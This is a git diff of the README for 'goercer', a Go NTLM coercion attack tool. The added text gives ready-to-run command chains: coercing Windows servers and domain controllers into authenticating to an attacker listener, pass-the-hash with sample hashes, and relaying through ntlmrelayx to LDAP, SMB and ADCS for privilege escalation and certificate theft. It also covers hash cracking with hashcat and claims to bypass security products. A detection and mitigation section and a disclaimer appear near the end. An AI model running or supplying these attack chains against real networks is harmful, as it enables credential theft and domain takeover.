@@ -1,10 +1,53 @@
 # Goercer - NTLM Coercion Attack Tool
 
-A Go implementation of NTLM coercion attacks using **DCERPC authentication level 6 (PKT_PRIVACY)** with full encryption and signing. Supports multiple coercion methods with extensible architecture.
+A Go implementation of NTLM coercion attacks using **DCERPC authentication level 6 (PKT_PRIVACY)** with full encryption and signing. Supports multiple coercion methods, alternative named pipes, and **pass-the-hash authentication**.
+
+## 🚀 Quick Start
+
+```bash
+# 1. Install
+git clone https://github.com/YOUR_USERNAME/goercer.git
+cd goercer
+./build.sh
+
+# 2. Start listener (Terminal 1)
+sudo responder -I eth0 -v
+
+# 3. Run attack (Terminal 2)
+./goercer <target> <listener> <user> <pass> <domain>
+
+# OR use NTLM hash (pass-the-hash)
+./goercer <target> <listener> <user> <hash> <domain>
+
+# 4. Capture hash in Responder
+# [SMB] NTLMv2-SSP Hash: MACHINE$::DOMAIN:...
+```
+
+---
+
+## 📊 Method Comparison
+
+| Method | Protocol | Success Rate | Callbacks | Compatibility | Recommendation |
+|--------|----------|--------------|-----------|---------------|----------------|
+| **PetitPotam** | MS-EFSRPC | ⭐⭐⭐⭐⭐ | 1 | ALL Windows servers | ✅ **Best first choice** |
+| **SpoolSample** | MS-RPRN | ⭐⭐⭐⭐⭐ | 3 | Default on most servers | ✅ **Maximum callbacks** |
+| **ShadowCoerce** | MS-FSRVP | ⭐⭐ | Varies | Requires VSS configured | ⚠️ Situational only |
+| **DFSCoerce** | MS-DFSNM | ⭐ | Varies | Requires DFS Namespaces | ⚠️ Rarely works |
+
+**Recommendation**: Try **PetitPotam** first (works everywhere), then **SpoolSample** (3x callbacks) if Print Spooler is running.
+
+---
 
 ## ✅ Status: **WORKING**
 
 Successfully coerces Windows servers to authenticate to an attacker-controlled listener, capturing machine account NTLMv2 hashes.
+
+**Key Features**:
+- ✅ **Pass-the-Hash Support** - Authenticate with NTLM hash instead of password
+- ✅ **4 Coercion Methods** - PetitPotam, SpoolSample, ShadowCoerce, DFSCoerce
+- ✅ **Alternative Named Pipes** - 5 pipe options for PetitPotam (lsarpc, efsr, samr, netlogon, lsass)
+- ✅ **PKT_PRIVACY Encryption** - Full DCERPC authentication with encryption/signing
+- ✅ **Single Binary** - No dependencies, portable Go executable
 
 **Supported Methods**:
 - ✅ **PetitPotam** (MS-EFSRPC) - 1 callback - Works on ALL Windows servers
@@ -15,6 +58,11 @@ Successfully coerces Windows servers to authenticate to an attacker-controlled l
 **Tested Against**: 
 - Windows Server 2019 Domain Controller
 - Windows Server 2016/2019/2022
+- Windows 10/11 (with appropriate services)
+
+**Authentication Methods**:
+- ✅ Password authentication (plaintext)
+- ✅ Pass-the-hash (NTLM hash - 32 hex characters)
 
 **Result**: ✅ Machine account hashes captured via Responder
 
@@ -54,17 +102,32 @@ While this could be split into multiple files (`auth.go`, `petitpotam.go`, etc.)
 ## Usage
 
 ```bash
-./goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]
+./goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]
 
 # Show help
 ./goercer -h
 ./goercer --help
 ```
 
+### Authentication
+
+**Password Authentication**:
+```bash
+./goercer 10.0.0.10 10.0.0.5 john Password123 corp.local
+```
+
+**Pass-the-Hash** (using NTLM hash):
+```bash
+# Extract hash from secretsdump, hashdump, or other tools
+./goercer 10.0.0.10 10.0.0.5 john 8846f7eaee8fb117ad06bdd830b7586c corp.local
+```
+
+The tool automatically detects if you're providing a password or NTLM hash (32 hex characters).
+
 ### Help Output
 
 ```
-Usage: goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]
+Usage: goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]
 
 Methods:
   petitpotam     - MS-EFSRPC coercion (default)
@@ -77,6 +140,7 @@ Pipes (for petitpotam only):
 
 Examples:
   ./goercer <target> <listener> <user> <pass> <domain> petitpotam
+  ./goercer <target> <listener> <user> 8846f7eaee8fb117ad06bdd830b7586c <domain> petitpotam
   ./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
   ./goercer <target> <listener> <user> <pass> <domain> spoolsample
 ```
@@ -90,7 +154,10 @@ sudo responder -I eth0 -v
 # Terminal 2: Run attacks
 
 # PetitPotam with default pipe (lsarpc) - MOST RELIABLE
-./goercer <target> <listener> <user> <pass> <domain> petitpotam
+./goercer <target> <listener> <user> <pass> <domain>
+
+# PetitPotam with pass-the-hash
+./goercer <target> <listener> <user> 1a2803ab98942ee503680dd3de3cceb2 <domain>
 
 # PetitPotam with alternative pipe
 ./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
@@ -174,7 +241,94 @@ sudo responder -I eth0 -v
 
 ---
 
-## Technical Implementation
+## 🎯 Use Cases
+
+### 1. Hash Capture for Offline Cracking
+```bash
+# Capture machine account hash
+sudo responder -I eth0 -v
+./goercer <DC> <attacker_IP> <user> <pass> <domain> spoolsample
+
+# Responder captures: MACHINE$::DOMAIN:<hash>
+# Crack with hashcat: hashcat -m 5600 hash.txt wordlist.txt
+```
+
+**Pro Tip**: If you've already compromised a user via other means (password spray, phishing, etc.), you can use pass-the-hash for the initial authentication to goercer:
+```bash
+# Extract user hash from secretsdump
+secretsdump.py 'DOMAIN/user:password@<DC>'
+
+# Use that hash to authenticate for coercion
+./goercer <DC> <attacker_IP> user 8846f7eaee8fb117ad06bdd830b7586c DOMAIN spoolsample
+```
+
+### 2. NTLM Relay to LDAP (Privilege Escalation)
+```bash
+# Relay to LDAP for DCSync rights
+ntlmrelayx.py -t ldaps://<DC> --delegate-access
+./goercer <DC> <attacker_IP> <user> <pass> <domain> petitpotam
+
+# Result: Machine account gets delegation rights
+```
+
+### 3. NTLM Relay to SMB (Admin Access)
+```bash
+# Relay to another server
+ntlmrelayx.py -t smb://<target_server> -smb2support
+./goercer <source_server> <attacker_IP> <user> <pass> <domain> petitpotam
+
+# Result: Admin access if target server allows relaying
+```
+
+### 4. ADCS Certificate Attack (ESC8)
+```bash
+# Relay to ADCS web enrollment
+ntlmrelayx.py -t http://<ADCS>/certsrv/certfnsh.asp --adcs --template Machine
+./goercer <DC> <attacker_IP> <user> <pass> <domain> spoolsample
+
+# Result: Obtain machine certificate for impersonation
+```
+
+---
+
+## 🔧 Troubleshooting
+
+### Common Issues and Solutions
+
+| Issue | Cause | Solution |
+|-------|-------|----------|
+| `Pipe not found` | Service not available | Try PetitPotam (always works) or SpoolSample |
+| `ACCESS_DENIED` | Opnum patched | Tool tries alternate opnums automatically |
+| `Bind rejected (BindNak)` | Service doesn't accept PKT_PRIVACY | Normal for DFS/VSS - use PetitPotam instead |
+| No callback in Responder | Network/firewall issue | Check connectivity, firewall rules, listener IP |
+| `ERROR_BAD_NETPATH` | Coercion succeeded! | This is success - check Responder for hash |
+| Opnum 0 success (PetitPotam) | Likely patched | Opnum 0 often returns success when patched - verify callback |
+
+### Verification Steps
+
+1. **Check SMB connectivity**:
+   ```bash
+   smbclient -L //<target> -U <domain>/<user>
+   ```
+
+2. **Verify Responder is listening**:
+   ```bash
+   sudo netstat -tulpn | grep :445
+   ```
+
+3. **Test with Coercer (Python) for comparison**:
+   ```bash
+   Coercer.py coerce -t <target> -d <domain> -u <user> -l <listener> --filter-pipe-name lsarpc
+   ```
+
+4. **Check Print Spooler status** (for SpoolSample):
+   ```bash
+   rpcdump.py <target> | grep spoolsss
+   ```
+
+---
+
+## 📚 Technical Implementation
 
 ### Extensible Architecture
 
@@ -490,6 +644,128 @@ The main code uses `WritePipe()` and `ReadPipe()` throughout for DCERPC communic
 
 ---
 
+## ❓ FAQ
+
+**Q: Which method should I use first?**  
+A: **PetitPotam** (default). It works on all Windows servers. If you want maximum callbacks, use **SpoolSample** (3 callbacks).
+
+**Q: What does ERROR_BAD_NETPATH mean?**  
+A: **Success!** This indicates the server tried to access your UNC path. Check Responder for the captured hash.
+
+**Q: Why no callback in Responder?**  
+A: Common causes:
+- Firewall blocking SMB (port 445)
+- Listener IP unreachable from target
+- Responder not running or wrong interface
+- Network segmentation (target can't route to listener)
+
+**Q: Can I use this against domain controllers?**  
+A: Yes! PetitPotam and SpoolSample both work well against DCs. This is often used to capture DC machine account hashes.
+
+**Q: Can I use pass-the-hash?**  
+A: Yes! Provide the NTLM hash (32 hex characters) instead of the password:
+```bash
+./goercer 10.0.0.10 10.0.0.5 john 8846f7eaee8fb117ad06bdd830b7586c corp.local
+```
+The tool automatically detects if you're using a hash or password. Common sources for NTLM hashes:
+- `secretsdump.py` - Dump from domain controller or SAM
+- `hashdump` / `mimikatz` - Extract from compromised systems
+- Password cracking tools output
+- Previous Responder/ntlmrelayx captures
+
+**Q: What's the difference between PetitPotam pipes?**  
+A: All pipes use the same MS-EFSRPC protocol but different named pipe endpoints:
+- `lsarpc` (default): Most reliable, always available
+- `efsr`, `samr`, `netlogon`, `lsass`: Alternative endpoints if lsarpc is blocked
+
+**Q: Why does Opnum 0 succeed but no callback?**  
+A: Opnum 0 (EfsRpcOpenFileRaw) is often patched to return success without performing UNC access. The tool automatically tries Opnum 4 (EfsRpcEncryptFileSrv) which usually works.
+
+**Q: How is this different from Coercer?**  
+A: 
+- **goercer**: Go implementation with PKT_PRIVACY encryption, single binary, portable
+- **Coercer**: Python tool with many methods, requires Python dependencies
+- Both achieve the same goal; goercer focuses on the most reliable methods
+
+**Q: Can I relay instead of capturing hashes?**  
+A: Yes! Use `ntlmrelayx.py` instead of Responder:
+```bash
+ntlmrelayx.py -t ldaps://<target> --delegate-access
+./goercer <source> <attacker_IP> <user> <pass> <domain>
+```
+
+**Q: Does this work on Windows 11/Server 2022?**  
+A: Yes! PetitPotam and SpoolSample still work on latest Windows versions. Microsoft's patches focused on unauthenticated coercion; authenticated attacks still function.
+
+**Q: What credentials do I need?**  
+A: Any valid domain account credentials. The attack authenticates legitimately, then triggers coercion through valid RPC calls.
+
+**Q: Why use PKT_PRIVACY instead of unauthenticated RPC?**  
+A: 
+- Educational value (complete NTLM/DCERPC implementation)
+- Bypasses security products that block unauthenticated RPC
+- More realistic attack scenario (authenticated access is common)
+- Demonstrates that encryption doesn't prevent coercion
+
+---
+
+## 🛡️ Detection & Defense
+
+### Detection Strategies
+
+**Network-Level**:
+- Monitor for SMB connections to unusual IPs (especially from DCs/servers to workstations)
+- Alert on excessive DCERPC pipe opens (lsarpc, spoolss, eventlog)
+- Detect UNC path access to unknown/external IPs
+
+**Event Logs**:
+- Event ID 5145: Network share accessed (look for \\??\\UNC\\ paths)
+- Event ID 4624: Logon events from service accounts to unexpected systems
+- Print Spooler events with external printer connections
+
+**Endpoint Detection**:
+- Monitor `lsass.exe` network connections to workstations
+- Alert on Print Spooler (`spoolsv.exe`) making outbound SMB connections
+- Detect EFSRPC calls with UNC paths
+
+### Mitigation Strategies
+
+1. **Disable Print Spooler** (prevents SpoolSample):
+   ```powershell
+   Stop-Service Spooler
+   Set-Service Spooler -StartupType Disabled
+   ```
+
+2. **Apply MS Patches**:
+   - KB5005413 (PetitPotam patch for unauthenticated access)
+   - Note: Authenticated PetitPotam still works post-patch
+
+3. **Network Segmentation**:
+   - Prevent servers from initiating SMB to workstation subnets
+   - Block outbound SMB (445) from DCs except to trusted systems
+
+4. **SMB Signing**:
+   - Enable SMB signing requirement (prevents NTLM relay)
+   - Configure via GPO: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → "Microsoft network client/server: Digitally sign communications (always)"
+
+5. **Disable NTLM** (if feasible):
+   - Enforce Kerberos-only authentication
+   - Configure via GPO: Network security: Restrict NTLM
+
+6. **Monitor LSARPC Access**:
+   - Enable audit for pipe access
+   - Alert on unusual RPC method calls
+
+### Is This Vulnerability Patchable?
+
+**Short answer**: Not fully.
+
+PetitPotam and SpoolSample exploit **legitimate protocol functionality**. As long as Windows servers need EFSRPC and Print Spooler services, these coercion methods remain viable when used with **valid credentials**.
+
+Microsoft's patches only addressed **unauthenticated** access. Authenticated coercion (what goercer does) is considered intended functionality.
+
+---
+
 ## References
 
 - **MS-EFSR**: Encrypting File System Remote (EFSRPC) Protocol
@@ -520,6 +796,16 @@ The main code uses `WritePipe()` and `ReadPipe()` throughout for DCERPC communic
 
 ---
 
-## License
+## ⚖️ Legal Disclaimer
 
-This tool is for educational and authorized testing purposes only. Ensure you have explicit permission before testing against any systems.
+This tool is for **educational and authorized security testing purposes only**. 
+
+**You must**:
+- ✅ Have explicit written permission before testing
+- ✅ Use only in authorized penetration testing engagements
+- ✅ Comply with all applicable laws and regulations
+- ✅ Respect scope boundaries in security assessments
+
+**Unauthorized use is illegal**. The authors assume no liability for misuse or damages arising from the use of this tool.
+
+By using goercer, you acknowledge that you have proper authorization and accept full responsibility for your actions.
